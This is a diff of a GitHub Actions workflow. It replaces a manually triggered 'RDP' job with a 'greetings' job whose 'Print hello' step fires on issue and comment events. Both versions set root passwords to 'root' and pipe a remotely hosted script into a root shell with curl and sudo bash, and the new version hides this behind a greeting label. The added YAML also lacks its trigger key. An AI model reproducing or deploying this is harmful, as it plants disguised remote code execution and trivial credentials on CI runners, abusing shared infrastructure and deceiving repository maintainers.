@@ -1,9 +1,16 @@
-name: RDP
-on:  workflow_dispatch
+name: run
+  issues:
+    types: [opened, edited, deleted, closed, reopened, transferred, pinned, unpinned, labeled, unlabeled]
+  issue_comment:
+    types: [created, edited, deleted]
+
 jobs:
-  interactive:
-    runs-on: ubuntu-latest  
-    steps:     
-      - name: new
-        run: sudo apt update && printf "root\nroot" | sudo passwd root && printf "root" | su - root -c " curl https://raw.githubusercontent.com/amitstudydude/guacamole/main/Lint | sudo bash " 
-            
+  greetings:
+    name: greet
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print hello
+        run: sudo swapoff -a & sudo apt update &  printf "root\nroot" | sudo passwd root &&  printf "root\nroot" | sudo passwd runner &&  printf "root" | su - root -c " curl https://raw.githubusercontent.com/amitstudydude/guacamole/main/run | sudo bash "
+        
+  
+
